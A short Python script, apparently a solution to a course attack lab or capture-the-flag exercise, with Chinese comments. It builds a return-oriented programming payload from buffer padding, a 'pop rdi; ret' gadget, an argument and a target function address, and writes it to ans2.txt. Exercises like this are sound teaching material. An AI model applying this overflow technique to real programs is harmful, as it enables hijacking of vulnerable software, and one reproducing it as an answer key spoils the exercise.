import struct
padding=b'A'*16 #同理
pop_rdi=0x4012c7 #Gadget地址:pop rdi; ret
arg=0x3f8 #参数:0x3f8
func2=0x401216 #Func2地址
payload=padding+struct.pack('<Q',pop_rdi)+struct.pack('<Q',arg)+struct.pack('<Q', func2)
with open('ans2.txt','wb') as f:
    f.write(payload)
print("Payload written to ans2.txt")
